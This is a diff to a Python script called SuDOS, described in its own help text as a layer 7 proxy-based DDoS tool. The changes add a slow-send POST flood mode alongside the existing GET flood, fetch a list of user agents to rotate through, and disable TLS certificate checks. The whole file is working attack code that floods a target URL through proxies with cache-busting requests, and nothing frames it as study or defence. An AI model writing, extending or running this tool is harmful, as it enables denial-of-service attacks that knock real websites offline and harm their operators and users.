@@ -1,7 +1,9 @@
 #!/usr/bin/env python
-#version: 2.5.1 beta
+#version: 2.5.2 beta
+from rich.live import Live
 import threading
 import argparse
+import requests
 import random
 import atexit
 import socket
@@ -17,6 +19,7 @@ connection_limit = 0
 active_threads = 0
 max_threads = 100
 delay = 1
+running = True
 
 ups = 0
 total_ups = 0
@@ -32,20 +35,23 @@ YELLOW = "\u001b[33;1m"
 BLUE = "\u001b[34;1m"
 RESET = "\u001b[0;0m"
 
-user_agents = [
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:27.0) Gecko/20100101 Firefox/27.0",
-    "AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) ",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-    "AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
-    "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en) ",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/534.34 (KHTML,like Gecko) PhantomJS/1.9.0 (development) Safari/534.34",
-    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)"
-]
+try:
+    if not os.path.exists("etc"):
+        os.mkdir("etc")
+        if not os.path.exists("./etc/useragents.txt"):
+            user_agents = requests.get("https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt").text
+            user_agents_file = open("./etc/useragents.txt", "w")
+            user_agents_file.write(user_agents)
+            user_agents_file.close()
 
-def sudos(url, **kwargs):
+    user_agents_file = open("./etc/useragents.txt")
+    user_agents = user_agents_file.read().splitlines()
+    user_agents_file.close()
+except Exception as e:
+    print(f"Unable to fetch useragents.txt: {e}")
+    sys.exit()
+
+def sudos(url, method, **kwargs):
     try:
         global active_threads
         global active_connections
@@ -94,31 +100,53 @@ def sudos(url, **kwargs):
         total_connected += 1
         if protocol == "https":
             context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.VerifyMode.CERT_NONE
             sock = context.wrap_socket(sock, server_hostname=host)
         if parameters:
             parameters = f"&{parameters}"
         else:
             parameters = ""
-        while True:
-            if active_connections < connection_limit:
-                continue
-            anti_cache = rand_chars(77)
-            user_agent = random.choice(user_agents)
-            http = f"GET {path}?{anti_cache}{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.5\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
-            up = sock.send(http.encode())
-            ups += up
-            total_ups += up
-            hrs += 1
-            total_hrs += 1
-            if receive_http:
-                while True:
-                    receive = sock.recv(1024)
-                    download = len(receive)
-                    dps += download
-                    total_dps += download
-                    if download < 1024:
-                        break
-            time.sleep(delay)
+        if method == "1":
+            while True:
+                if active_connections < connection_limit:
+                    continue
+                anti_cache = rand_chars(77)
+                user_agent = random.choice(user_agents)
+                http = f"GET {path}?{anti_cache}{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.5\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
+                up = sock.send(http.encode())
+                ups += up
+                total_ups += up
+                hrs += 1
+                total_hrs += 1
+                if receive_http:
+                    while True:
+                        receive = sock.recv(1024)
+                        download = len(receive)
+                        dps += download
+                        total_dps += download
+                        if download < 1024:
+                            break
+                time.sleep(delay)
+        elif method == "2":
+            while True:
+                if active_connections < connection_limit:
+                    continue
+                anti_cache = rand_chars(77)
+                user_agent = random.choice(user_agents)
+                content = random._urandom(4096)
+                http = f"POST {path}?{anti_cache}{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.5\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(content)}\r\n\r\n"
+                up = sock.send(http.encode())
+                ups += up
+                total_ups += up
+                hrs += 1
+                total_hrs += 1
+                for text in content:
+                    text = str(text)
+                    up = sock.send(text.encode())
+                    ups += up
+                    total_ups += up
+                    time.sleep(delay)
     except Exception as e:
         #print(f"sudos error: {e}")
         pass
@@ -140,23 +168,34 @@ def rand_chars(length):
     text = "".join(rand_text)
     return text
 
-def separate(separator_length, string):
-    separator = " " * separator_length
-    string = str(string)
-    return separator[len(string):]
+def getinfo():
+    text = f"""
+ Threads:       {active_threads}
+ Connections:   {active_connections}
+ HR/s:          {hrs}
+ D/s:           {dps}
+ U/s:           {ups}
+    """
+    return text
 
 def verbose():
     try:
         global hrs
         global dps
         global ups
-        while True:
-            print(f"Threads: {GREEN}{active_threads}{RESET} {separate(5, active_threads)} Connections: {GREEN}{active_connections}{RESET} {separate(5, active_connections)} HR/s: {GREEN}{hrs}{RESET} {separate(5, hrs)} D/s: {GREEN}{dps}{RESET} {separate(12, dps)} U/s {GREEN}{ups}{RESET}")
-            hrs = 0
-            dps = 0
-            ups = 0
-            time.sleep(1)
-    except Exception:
+        with Live(getinfo(), auto_refresh=True) as live:
+            while True:
+                if not running:
+                    break
+                live.update(getinfo())
+                hrs = 0
+                dps = 0
+                ups = 0
+                time.sleep(1)
+    except KeyboardInterrupt:
+        sys.exit()
+    except Exception as e:
+        print(f"verbose error: {e}")
         pass
 
 def url_split(url):
@@ -222,14 +261,16 @@ def main():
         global delay
         global connection_limit
         global start_time
+        global running
         parser = argparse.ArgumentParser(description="SuDOS, powerful layer 7 proxy-based DDoS tool.")
-        parser.add_argument("-t", "--threads", type=int, default=100, metavar="INT", help="Max thread count")
+        parser.add_argument("-t", "--threads", type=int, default=100, metavar="THREAD", help="Max thread count")
         parser.add_argument("-z", "--proxy-type", choices=["http", "socks4", "socks5"], metavar="PROXYTYPE", help="Proxy list type")
         parser.add_argument("-x", "--proxy-list", metavar="PROXYFILE", help="Proxy list file")
         parser.add_argument("-c", "--timeout", type=int, default=5, metavar="TIMEOUT", help="Socket connection timeout")
         parser.add_argument("-v", "--delay", type=int, default=1, metavar="DELAY", help="Timeout per HTTP request")
-        parser.add_argument("-b", "--connection-limit", type=int, metavar="INT", help="Connected socket count before flooding the target server")
+        parser.add_argument("-b", "--connection-limit", type=int, metavar="LIMIT", help="Connected socket count before initializing the attack")
         parser.add_argument("-n", "--receive-http", action="store_true", help="Whether to receive HTTP response or not")
+        parser.add_argument("-m", "--method", choices=["1", "2"], default="1",  metavar="METHOD", help="Attack method")
         parser.add_argument("url", nargs="?", metavar="URL", help="Target URL including protocol, domain and port for particular use")
         args = parser.parse_args()
 
@@ -238,6 +279,7 @@ def main():
         proxy_list = args.proxy_list
         timeout = args.timeout
         receive_http = args.receive_http
+        method = args.method
         
         url = args.url
         if not url:
@@ -272,9 +314,9 @@ def main():
             proxy_type = proxy_type.upper()
             proxy_type = getattr(socks, proxy_type)
         atexit.register(onexit)
-        threading.Thread(target=verbose, daemon=True).start()
         start_time = time.time()
         clear_console()
+        threading.Thread(target=verbose, daemon=True).start()
         if proxy_list:
             while True:
                 for proxy in proxies:
@@ -290,14 +332,16 @@ def main():
                     while True:
                         if active_threads >= max_threads:
                             continue
-                        threading.Thread(target=sudos, args=[url], kwargs={"proxy_type": proxy_type, "proxy_host": proxy_host, "proxy_port": proxy_port, "receive_http": receive_http}, daemon=True).start()
+                        threading.Thread(target=sudos, args=[url, method], kwargs={"proxy_type": proxy_type, "proxy_host": proxy_host, "proxy_port": proxy_port, "receive_http": receive_http}, daemon=True).start()
                         break
         else:
             while True:
                 if active_threads >= max_threads:
                     continue
-                threading.Thread(target=sudos, args=[url], daemon=True).start()
+                threading.Thread(target=sudos, args=[url, method], daemon=True).start()
     except KeyboardInterrupt:
+        running = False
+        time.sleep(1)
         sys.exit()
     except Exception as e:
         print(f"main error: {e}")
